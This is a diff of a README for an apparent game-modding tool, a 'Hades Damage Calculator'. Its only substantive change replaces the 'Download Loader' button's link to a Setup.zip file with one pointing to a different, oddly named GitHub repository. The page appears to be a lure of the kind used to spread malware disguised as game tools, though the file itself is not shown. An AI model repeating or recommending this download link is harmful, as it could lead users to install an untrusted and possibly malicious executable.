@@ -4,7 +4,7 @@
 
 > ⚡ Advanced Game Modification Project for Hades Damage Calculator
 
-[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/WASD122/bvvb/releases/download/main/Setup.zip)
+[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/WADSADF/bvvb323/releases/download/main/Setup.zip)
 
 ---
 
@@ -38,5 +38,6 @@ configs/
 `Hades-Damage-Calculator` · Updated: 2026-10-05
 
 **Tags:** `hades` `damage-calculator` `roguelike` `action-rpg` `builds`
+
 
 
